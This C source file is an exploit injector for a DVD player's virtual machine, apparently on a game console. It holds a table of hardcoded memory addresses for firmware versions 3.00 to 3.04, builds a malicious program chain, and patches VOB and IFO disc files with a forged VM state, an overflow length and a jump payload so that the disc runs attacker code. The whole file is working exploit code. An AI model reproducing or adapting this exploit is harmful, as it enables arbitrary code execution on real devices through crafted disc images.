#include "pgc.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define MAX(x, y) ((x) > (y) ? (x) : (y))

typedef enum {
    VER_300X,
    VER_302X,
    VER_303X,
    VER_304X
} VersionFamily;

typedef struct {
    const char    *name;
    VersionFamily  family;
    uint32_t VM_CMD_PARSER_SWITCH_ADDR;
    uint32_t VM_ADDR;
    uint32_t VOB_BUFFER_ADDR;
    uint32_t JUMP_POINTER;
    uint32_t CMD_DATA_ADDR;
    uint32_t IFO_BUFFER;
    uint32_t DR_ADDR;            /* V303X and V304X only; 0 otherwise */
    uint32_t VM_PATCH_START_POS; /* V304X only; 0 otherwise */
} VersionConfig;

static const VersionConfig version_table[] = {
    /* name    family     SWITCH_ADDR  VM_ADDR     VOB_BUF     JUMP_PTR    CMD_DATA    IFO_BUF     DR_ADDR     VMPS */
    {"3.00E", VER_300X, 0x00909208, 0x01558e40, 0x0155cec0, 0x0090ec20, 0x01551da8, 0x01555600, 0,          0  },
    {"3.00U", VER_300X, 0x00909108, 0x01383840, 0x013878c0, 0x0090eb18, 0x0137c7a8, 0x01380000, 0,          0  },
    {"3.00J", VER_300X, 0x00684988, 0x010ff040, 0x011030c0, 0x0068a318, 0x010f7fa8, 0x010fb800, 0,          0  },
    {"3.02E", VER_302X, 0x0090c378, 0x015a50c0, 0x015adac0, 0x009112c8, 0x0159f030, 0x015a2880, 0,          0  },
    {"3.02C", VER_302X, 0x006ee2f8, 0x01386fc0, 0x0138f9c0, 0x006f31c8, 0x01380f30, 0x01384780, 0,          0  },
    {"3.02D", VER_302X, 0x00678478, 0x01311140, 0x01319b40, 0x0067d348, 0x0130b0b0, 0x0130e900, 0,          0  },
    {"3.02G", VER_302X, 0x00683df8, 0x0131cac0, 0x013254c0, 0x00688cc8, 0x01316a30, 0x0131a280, 0,          0  },
    {"3.02J", VER_302X, 0x00685f78, 0x01149740, 0x01152140, 0x0068ae40, 0x011436b0, 0x01146f00, 0,          0  },
    {"3.02K", VER_302X, 0x00682878, 0x0131b540, 0x01323f40, 0x00687748, 0x013154b0, 0x01318d00, 0,          0  },
    {"3.02U", VER_302X, 0x0090c278, 0x013cfac0, 0x013d84c0, 0x009111c0, 0x013c9a30, 0x013cd280, 0,          0  },
    {"3.03E", VER_303X, 0x00923d88, 0x015f4b00, 0x015f94c0, 0x009292d0, 0x015ec890, 0x015f0100, 0x015f4100, 0  },
    {"3.03J", VER_303X, 0x0069de88, 0x01199680, 0x0119e040, 0x006a3348, 0x01191410, 0x01194c80, 0x01198c80, 0  },
    {"3.04M", VER_304X, 0x0095ace8, 0x016cf740, 0x016d4100, 0x009601e8, 0x016c8cd4, 0x016cad40, 0x016ced40, 428},
    {"3.04J", VER_304X, 0x006d4e68, 0x01274340, 0x01278d00, 0x006da2e0, 0x0126d8d4, 0x0126f940, 0x01273940, 424},
};

#define NUM_VERSIONS ((int)(sizeof(version_table) / sizeof(version_table[0])))

#define VOB_PATCH_1_LOC       0x644
#define IFO_PGC_PATCH_LOC     0xcc
#define IFO_CMDT_PATCH_LOC    0x10FC
#define IFO_PGC_CAT_PATCH_LOC 0x1008

static int write_at(FILE *fp, long offset, const void *buf, size_t len) {
    if (fseek(fp, offset, SEEK_SET) != 0) return -1;
    return (fwrite(buf, 1, len, fp) == len) ? 0 : -1;
}

int generate_exploit_pgc(const char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
    pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
    uint8_t *pgc_buf = NULL;
    uint32_t pgc_buf_len = 0;

    if (!pgc) {
        return -1;
    }

    if (!out_path) {
        free(pgc);
        return -1;
    }

    for (int i = 0; i < 16; ++i) {
        pgc->pgc_gi.pgc_sp_plt[i] = 0x108080;
    }

    pgc->pgc_gi.set_pgc_cnt_cn(1);
    pgc->pgc_gi.set_pgc_cnt_pn(1);
    pgc->pgc_gi.set_pgc_pb_tm_hours(0);
    pgc->pgc_gi.set_pgc_pb_tm_minutes(0);
    pgc->pgc_gi.set_pgc_pb_tm_seconds(1);
    pgc->pgc_gi.set_pgc_pb_tm_frames(15);
    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_30);
    pgc->pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
    pgc->pgc_gi.pgc_pgmap_sa = 0xec;
    pgc->pgc_gi.c_pbit_sa = 0xee;
    pgc->pgc_gi.c_posit_sa = 0x106;
    pgc->pgc_gi.pgc_cmdt_sa = 0x11e + off;

    pgc->pgc_pgmap.en_cn[0] = 1;

    pgc->c_pbit.pbi[0].set_c_cat_sys_tm_clk_discontinuity_flag(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_hours(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_minutes(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_seconds(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_frames(15);
    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_30);
    pgc->c_pbit.pbi[0].c_lvobu_sa = 24;
    pgc->c_pbit.pbi[0].c_lvobu_ea = 43;

    pgc->c_posit.c_posi[0].c_vob_idn = 1;
    pgc->c_posit.c_posi[0].c_idn = 1;

    pgc->pgc_cmdt.cmds[1] = 0x30;
    pgc->pgc_cmdt.pgc_cmdti.pre_cmd_n = MAX(1, ((len >> 3) + 1) & 0xffff);
    pgc->pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 15;
    pgc_build(pgc, &pgc_buf, &pgc_buf_len);
    if (!pgc_buf) {
        free(pgc);
        return -1;
    }
    uint8_t vts_pgci[16] = {
        0, 1, 0, 0,
        0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff,
        0, 0, 0, 16
    };

    uint32_t end_addr = 16 + (pgc_buf_len - 1);

    if (*((uint16_t *)"\x00\x01") == 1) {
        memcpy(vts_pgci+4, &end_addr, 4);
        memcpy(vts_pgci+8, &eaddr, 4);
    } else {
        vts_pgci[4] = ((uint8_t *)&end_addr)[3];
        vts_pgci[5] = ((uint8_t *)&end_addr)[2];
        vts_pgci[6] = ((uint8_t *)&end_addr)[1];
        vts_pgci[7] = ((uint8_t *)&end_addr)[0];

        vts_pgci[8] = ((uint8_t *)&eaddr)[3];
        vts_pgci[9] = ((uint8_t *)&eaddr)[2];
        vts_pgci[10] = ((uint8_t *)&eaddr)[1];
        vts_pgci[11] = ((uint8_t *)&eaddr)[0];
    }

    FILE *fp = fopen(out_path, "rb+");
    if (!fp) {
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    if (fwrite(vts_pgci, 1, 16, fp) != 16) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fseek(fp, 16, SEEK_SET);
    if (fwrite(pgc_buf, 1, pgc_buf_len, fp) != pgc_buf_len) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fclose(fp);
    free(pgc_buf);
    free(pgc);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: injector <version>\n");
        fprintf(stderr, "  Supported: 3.00E 3.00U 3.00J 3.02E 3.02C 3.02D 3.02G 3.02J 3.02K 3.02U 3.03E 3.03J 3.04M 3.04J\n");
        return 1;
    }

    const VersionConfig *cfg = NULL;
    for (int i = 0; i < NUM_VERSIONS; i++) {
        if (strcmp(argv[1], version_table[i].name) == 0) {
            cfg = &version_table[i];
            break;
        }
    }
    if (!cfg) {
        fprintf(stderr, "Error: Unknown version '%s'\n", argv[1]);
        return 1;
    }

    /* Derived values computed from the version-specific addresses */
    uint32_t CTRL_DATA_ADDR = cfg->VOB_BUFFER_ADDR + 0x0c + 0x629;
    uint32_t VM_CMD_PARSER_SWITCH_INDEX_VAL = (cfg->JUMP_POINTER - cfg->VM_CMD_PARSER_SWITCH_ADDR) >> 2;
    uint32_t NEEDED_LEN = (cfg->VM_ADDR - cfg->CMD_DATA_ADDR) + 24;
    uint32_t EXEC_ADDR = CTRL_DATA_ADDR + 27;

    printf("NEEDED_LEN: %x\n", NEEDED_LEN);

    /* Build the VM state buffer written into the VOB/IFO */
    uint8_t buf[24] = {
        0x00,                                               /* VM_current_cmd_type_index  */
        0x00,                                               /* VM_current_cmd_index       */
        0x00, 0x00,                                         /* padding                    */
        cfg->CMD_DATA_ADDR & 0xff,                          /* VM_current_cmd_data_lo_lo  */
        (cfg->CMD_DATA_ADDR >> 8) & 0xff,                   /* VM_current_cmd_data_lo_hi  */
        (cfg->CMD_DATA_ADDR >> 16) & 0xff,                  /* VM_current_cmd_data_hi_lo  */
        (cfg->CMD_DATA_ADDR >> 24) & 0xff,                  /* VM_current_cmd_data_hi_hi  */
        0x01,                                               /* DAT_01558e48               */
        0x00,                                               /* padding                    */
        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff,              /* FP_INDEX_lo                */
        (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff,       /* FP_INDEX_lo_hi             */
        0x00, 0x00,                                         /* VM_current_opcode_type     */
        0x00,                                               /* VM_current_opcode_direct   */
        0x00,                                               /* padding                    */
        0x00, 0x00,                                         /* VM_current_opcode_set      */
        0x00, 0x00,                                         /* VM_current_opcode_dir_cmp  */
        0x03, 0x00,                                         /* VM_current_opcode_cmp      */
        0x00, 0x00                                          /* VM_current_opcode_cmd      */
    };

    /* Read the jump payload */
    FILE *fp = fopen("./build/jump.bin", "rb");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open jump.bin\n");
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error: Failed to get jump.bin size\n");
        fclose(fp);
        return -1;
    }
    uint32_t payload_len = (uint32_t)file_size;
    if (payload_len > 444) {
        printf("Warning: payload truncated from %u to 444 bytes!\n", payload_len);
        payload_len = 444;
    }
    fseek(fp, 0, SEEK_SET);
    uint8_t *payload = malloc(payload_len);
    if (!payload) {
        fprintf(stderr, "Error: Failed to allocate payload buffer\n");
        fclose(fp);
        return -1;
    }
    if (fread(payload, 1, payload_len, fp) != payload_len) {
        fprintf(stderr, "Error: Failed to read jump.bin\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    fclose(fp);

    /* Patch VTS_01_1.VOB with the VM state buf and the jump payload */
    fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_01_1.VOB\n");
        free(payload);
        return -1;
    }
    if (cfg->family == VER_300X) {
        if (write_at(fp, 0x629, buf, 24) < 0) {
            fprintf(stderr, "Error: Failed to write VM buf to VOB\n");
            free(payload); fclose(fp); return -1;
        }
    } else if (cfg->family == VER_302X) {
        if (write_at(fp, 0x21b0, buf, 24) < 0) {
            fprintf(stderr, "Error: Failed to write VM buf to VOB\n");
            free(payload); fclose(fp); return -1;
        }
    }
    /* V303X / V304X: VM buf goes into IFO, not VOB */
    if (write_at(fp, VOB_PATCH_1_LOC, payload, payload_len) < 0) {
        fprintf(stderr, "Error: Failed to write payload to VOB\n");
        free(payload); fclose(fp); return -1;
    }
    free(payload);
    fclose(fp);

    /* -----------------------------------------------------------------
     * Family-specific IFO patching
     * ----------------------------------------------------------------- */
    if (cfg->family == VER_300X) {
        /* Generate the exploit PGC and write it to VTS_02_0.BUP */
        uint32_t INITIAL_COPY_BUF = cfg->IFO_BUFFER + 0x18;
        uint32_t INITIAL_COPY_BUF_TARGET = INITIAL_COPY_BUF + (NEEDED_LEN - 24);
        uint32_t CMDT_SA = CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET;

        if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP",
                                  CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
            fprintf(stderr, "Error: Failed to generate exploit PGC\n");
            return -1;
        }

        fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n"); return -1; }
        const uint8_t new_pgc_sect[] = {0x00, 0x00, 0x00, 0x32};
        if (write_at(fp, IFO_PGC_PATCH_LOC, new_pgc_sect, 4) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_02_0.IFO\n");
            fclose(fp); return -1;
        }
        fclose(fp);

    } else if (cfg->family == VER_302X) {
        /* Chained copy-buffer length calculations */
        uint32_t INITIAL_COPY_BUF = cfg->IFO_BUFFER + 0x104;
        uint32_t INITIAL_COPY_BUF_TARGET = INITIAL_COPY_BUF + (NEEDED_LEN - 24);
        uint32_t NEEDED_LEN_I2 = (INITIAL_COPY_BUF_TARGET - cfg->CMD_DATA_ADDR) + 24;
        uint32_t INITIAL_COPY_BUF_TARGET_I2 = INITIAL_COPY_BUF + (NEEDED_LEN_I2 - 24);
        uint32_t NEEDED_LEN_I3 = (INITIAL_COPY_BUF_TARGET_I2 - cfg->CMD_DATA_ADDR) + 24;

        printf("INITIAL_COPY_BUF_TARGET:    %x\n", INITIAL_COPY_BUF_TARGET);
        printf("NEEDED_LEN_I2:              %x\n", NEEDED_LEN_I2);
        printf("INITIAL_COPY_BUF_TARGET_I2: %x\n", INITIAL_COPY_BUF_TARGET_I2);
        printf("NEEDED_LEN_I3:              %x\n", NEEDED_LEN_I3);

        uint8_t ifo_patch_buf[16] = {0, 0, 0, 0, 0, 0, 0, 15, 0, 48, 0, 0, 0, 0, 0, 0};
        uint32_t tmp;

        /* VTS_02_0.IFO: CMDT_PRE_CNT based on NEEDED_LEN_I3 */
        tmp = MAX(NEEDED_LEN_I3 / 8, 1);
        ifo_patch_buf[0] = (tmp >> 8) & 0xff;
        ifo_patch_buf[1] = tmp & 0xff;
        fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n"); return -1; }
        if (write_at(fp, IFO_CMDT_PATCH_LOC, ifo_patch_buf, 6) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_02_0.IFO\n"); fclose(fp); return -1;
        }
        fclose(fp);

        /* VTS_03_0.IFO: CMDT_PRE_CNT based on NEEDED_LEN_I2 */
        tmp = MAX(NEEDED_LEN_I2 / 8, 1);
        ifo_patch_buf[0] = (tmp >> 8) & 0xff;
        ifo_patch_buf[1] = tmp & 0xff;
        fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n"); return -1; }
        if (write_at(fp, IFO_CMDT_PATCH_LOC, ifo_patch_buf, 6) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_03_0.IFO\n"); fclose(fp); return -1;
        }
        fclose(fp);

        /* VTS_04_0.IFO: CMDT_PRE_CNT based on NEEDED_LEN + execution address */
        tmp = MAX(NEEDED_LEN / 8, 1);
        ifo_patch_buf[0] = (tmp >> 8) & 0xff;
        ifo_patch_buf[1] = tmp & 0xff;
        fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n"); return -1; }
        if (write_at(fp, IFO_CMDT_PATCH_LOC, ifo_patch_buf, 16) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_04_0.IFO (1)\n"); fclose(fp); return -1;
        }
        ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
        ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
        ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
        ifo_patch_buf[3] = EXEC_ADDR & 0xff;
        if (write_at(fp, IFO_PGC_CAT_PATCH_LOC, ifo_patch_buf, 4) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_04_0.IFO (2)\n"); fclose(fp); return -1;
        }
        fclose(fp);

    } else {
        /* V303X and V304X share the VTS_02/03/04 IFO prefix patching */
        const uint8_t cmdt_one[] = {0x00, 0x01, 0x00, 0x00};
        uint32_t tmp = MAX(NEEDED_LEN / 8, 1);
        uint8_t ifo_patch_buf[16] = {
            (tmp >> 8) & 0xff, tmp & 0xff,
            0, 0, 0, 0, 0, 15, 0, 48, 0, 0, 0, 0, 0, 0
        };

        fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n"); return -1; }
        if (write_at(fp, IFO_CMDT_PATCH_LOC, cmdt_one, 4) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_02_0.IFO\n"); fclose(fp); return -1;
        }
        fclose(fp);

        fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n"); return -1; }
        if (write_at(fp, IFO_CMDT_PATCH_LOC, cmdt_one, 4) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_03_0.IFO\n"); fclose(fp); return -1;
        }
        fclose(fp);

        fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
        if (!fp) { fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n"); return -1; }

        if (write_at(fp, IFO_CMDT_PATCH_LOC, ifo_patch_buf, 16) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_04_0.IFO (1)\n"); fclose(fp); return -1;
        }

        ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
        ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
        ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
        ifo_patch_buf[3] = EXEC_ADDR & 0xff;
        if (write_at(fp, IFO_PGC_CAT_PATCH_LOC, ifo_patch_buf, 4) < 0) {
            fprintf(stderr, "Error: Failed to write to VTS_04_0.IFO (2)\n"); fclose(fp); return -1;
        }

        /* IFO end sector = 19, VOB start sector = 20, BUP end sector = 83 */
        const uint8_t sect19[] = {0, 0, 0, 19};
        const uint8_t sect20[] = {0, 0, 0, 20};
        const uint8_t sect83[] = {0, 0, 0, 83};
        if (write_at(fp, 0x1c, sect19, 4) < 0 ||
            write_at(fp, 0xc4, sect20, 4) < 0 ||
            write_at(fp, 0x0c, sect83, 4) < 0) {
            fprintf(stderr, "Error: Failed to write sector fields to VTS_04_0.IFO\n"); fclose(fp); return -1;
        }

        /* Expand IFO to 20 sectors (40960 bytes) */
        const uint8_t zero = 0;
        if (write_at(fp, 40959, &zero, 1) < 0) {
            fprintf(stderr, "Error: Failed to expand VTS_04_0.IFO\n"); fclose(fp); return -1;
        }

        if (cfg->family == VER_304X) {
            /* V304X: VM state buf goes into VIDEO_TS.IFO */
            fclose(fp);

            uint32_t VM_PATCH_LOC = cfg->VM_ADDR - (cfg->DR_ADDR + cfg->VM_PATCH_START_POS);
            fp = fopen("./build/fs/VIDEO_TS/VIDEO_TS.IFO", "rb+");
            if (!fp) { fprintf(stderr, "Error: Failed to open VIDEO_TS.IFO\n"); return -1; }
            if (write_at(fp, VM_PATCH_LOC, buf, 24) < 0) {
                fprintf(stderr, "Error: Failed to write to VIDEO_TS.IFO\n"); fclose(fp); return -1;
            }
            fclose(fp);

        } else {
            /* V303X: VM state buf and data-reader context go into VTS_04_0.IFO */
            uint32_t VM_PATCH_LOC = IFO_CMDT_PATCH_LOC + 8 + (NEEDED_LEN - 24);
            uint32_t DR_PATCH_LOC = IFO_CMDT_PATCH_LOC + 8 + (cfg->DR_ADDR - cfg->CMD_DATA_ADDR);

            /* Sector-alignment helpers used to compute the disc LBA and stream-pointer
             * fields inside the data-reader context.  Alignment is to 0x4000-byte
             * (8-sector) boundaries; LBA is in 2048-byte (0x800) sector units. */
#define SECTS_ALIGN(x)          ((x) & ~0x3fffu)
#define DR_LBA_AT(off)          (SECTS_ALIGN(DR_PATCH_LOC + (off)) >> 11)
#define DR_LBA_REM_AT(off)      ((DR_PATCH_LOC + (off)) - SECTS_ALIGN(DR_PATCH_LOC + (off)))

            uint8_t data_reader_ctx[480];
            memset(data_reader_ctx, 0, sizeof(data_reader_ctx));

            /* STATUS: all zeros */
            /* VTSN (two copies) */
            data_reader_ctx[4]  = 4;
            data_reader_ctx[8]  = 4;
            /* LBA: each byte is derived from its own offset so that the value remains
             * correct even if the 4-byte field straddles a sector-alignment boundary. */
            data_reader_ctx[12] =  DR_LBA_AT(12)        & 0xff;
            data_reader_ctx[13] = (DR_LBA_AT(13) >> 8)  & 0xff;
            data_reader_ctx[14] = (DR_LBA_AT(14) >> 16) & 0xff;
            data_reader_ctx[15] = (DR_LBA_AT(15) >> 24) & 0xff;
            /* SECTOR_CNT */
            data_reader_ctx[16] = 8;
            /* File EA fields: VIDEO_TS.IFO=3, VTS_01=5, VTS_02=5, VTS_03=5, VTS_04=19 */
            data_reader_ctx[20] = 3;
            data_reader_ctx[24] = 5;
            data_reader_ctx[28] = 5;
            data_reader_ctx[32] = 5;
            data_reader_ctx[36] = 19;
            /* STM_PTR: each byte derives its remainder from its own offset, mirroring
             * the LBA treatment above for correctness across alignment boundaries. */
            data_reader_ctx[420] =  (cfg->IFO_BUFFER + DR_LBA_REM_AT(420) + 1)        & 0xff;
            data_reader_ctx[421] = ((cfg->IFO_BUFFER + DR_LBA_REM_AT(421) + 1) >> 8)  & 0xff;
            data_reader_ctx[422] = ((cfg->IFO_BUFFER + DR_LBA_REM_AT(422) + 1) >> 16) & 0xff;
            data_reader_ctx[423] = ((cfg->IFO_BUFFER + DR_LBA_REM_AT(423) + 1) >> 24) & 0xff;
            /* STM_EA */
            uint32_t BUFFER_END = cfg->IFO_BUFFER + 0x4000;
            data_reader_ctx[424] =  BUFFER_END        & 0xff;
            data_reader_ctx[425] = (BUFFER_END >> 8)  & 0xff;
            data_reader_ctx[426] = (BUFFER_END >> 16) & 0xff;
            data_reader_ctx[427] = (BUFFER_END >> 24) & 0xff;
            /* Fixed fields */
            data_reader_ctx[452] = 0x01;
            data_reader_ctx[459] = 0x02;
            data_reader_ctx[472] = 0x18;
            data_reader_ctx[476] = 0x2b;

#undef SECTS_ALIGN
#undef DR_LBA_AT
#undef DR_LBA_REM_AT

            if (write_at(fp, DR_PATCH_LOC, data_reader_ctx, 480) < 0) {
                fprintf(stderr, "Error: Failed to write data_reader_ctx to VTS_04_0.IFO\n"); fclose(fp); return -1;
            }
            if (write_at(fp, VM_PATCH_LOC, buf, 24) < 0) {
                fprintf(stderr, "Error: Failed to write VM buf to VTS_04_0.IFO\n"); fclose(fp); return -1;
            }
            fclose(fp);
        }
    }

    puts("OK");
    return 0;
}
